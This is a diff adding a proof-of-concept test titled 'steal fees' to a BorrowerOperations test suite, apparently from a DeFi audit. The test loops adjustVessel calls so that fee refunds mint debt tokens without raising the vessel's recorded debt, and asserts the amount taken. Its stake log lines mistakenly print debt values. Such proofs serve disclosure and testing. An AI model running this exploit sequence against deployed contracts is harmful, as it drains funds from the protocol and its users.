@@ -96,6 +96,94 @@ contract("BorrowerOperations", async accounts => {
 			await loadFixture(deployContractsFixture)
 		})
 
+		it.only("steal fees", async () => {
+			// Open a Vessel
+			await openVessel({
+				asset: erc20.address,
+				extraVUSDAmount: toBN(dec(100000, 18)),
+				ICR: toBN(dec(2, 18)),
+				extraParams: { from: D },
+			})
+
+			// Keep track of the balances before the attack
+			const vesselColStart = (await contracts.vesselManager.Vessels(D, erc20.address)).coll
+			const vesselDebtStart = await contracts.vesselManager.getVesselDebt(erc20.address, D)
+			const vesselStakeStart = (await contracts.vesselManager.Vessels(D, erc20.address)).stake
+			const userColStart = await erc20.balanceOf(D)
+			const userDebtStart = await debtToken.balanceOf(D)
+
+			// Reduce the borrowing fee to show the worst case scenario
+			// With the default values configured, `borrowingFee < 44` will be sufficient for the attack (0.44%)
+			// Meaning `refundFee - borrowingFee > 0`
+			// In that case, the debt will increase, but the refunds will still be higher => Enough to take profit from the attack
+			await adminContract.setBorrowingFee(erc20.address, "0")
+
+			// This loop performs the attack
+			// The attack can be repeated indefinitely.
+			const repeat = 5
+			for (let i = 0; i < repeat; i++) {
+				await borrowerOperations.adjustVessel(
+					erc20.address,
+					0,
+					"0",
+					"30000000000000000000000",
+					true,
+					D,
+					D,
+					{ from: D }
+				)
+
+				await borrowerOperations.adjustVessel(
+					erc20.address,
+					0,
+					"0",
+					"30000000000000000000000",
+					false,
+					D,
+					D,
+					{ from: D }
+				)
+			}
+			
+			// Keep track of final balances
+			const vesselColEnd = (await contracts.vesselManager.Vessels(D, erc20.address)).coll
+			const vesselDebtEnd = await contracts.vesselManager.getVesselDebt(erc20.address, D)
+			const vesselStakeEnd = (await contracts.vesselManager.Vessels(D, erc20.address)).stake
+			const userColEnd = await erc20.balanceOf(D)
+			const userDebtEnd = await debtToken.balanceOf(D)
+
+			console.log("Vessel Col Start:  ", vesselColStart.toString())
+			console.log("Vessel Col End:    ", vesselColEnd.toString())
+			console.log("")
+
+			console.log("Vessel Debt Start: ", vesselDebtStart.toString())
+			console.log("Vessel Debt End:   ", vesselDebtEnd.toString())
+			console.log("")
+
+			console.log("Vessel Stake Start:", vesselDebtStart.toString())
+			console.log("Vessel Stake End:  ", vesselDebtEnd.toString())
+			console.log("")
+
+			console.log("User Col Start:    ", userColStart.toString())
+			console.log("User Col End:      ", userColEnd.toString())
+			console.log("")
+
+			console.log("User Debt Start:   ", userDebtStart.toString())
+			console.log("User Debt End:     ", userDebtEnd.toString())
+			console.log("")
+
+			// Assert that no other balances have changed
+			assert.equal(vesselDebtStart.toString(), vesselDebtEnd.toString())
+			assert.equal(vesselColStart.toString(), vesselColEnd.toString())
+			assert.equal(vesselStakeStart.toString(), vesselStakeEnd.toString())
+			assert.equal(userColStart.toString(), userColEnd.toString())
+
+			// Stolen debt tokens (by minting without increasing debt in the vessel)
+			const stolenDebtTokens = (userDebtEnd - userDebtStart).toString();
+			const expectedStolenDebtTokens = "353802907894836900000"
+			assert.equal(stolenDebtTokens, expectedStolenDebtTokens)
+		})
+
 		it("openVessel(): invalid collateral reverts", async () => {
 			const randomErc20 = await ERC20Mock.new("RAND", "RAND", 18)
 			await assertRevert(
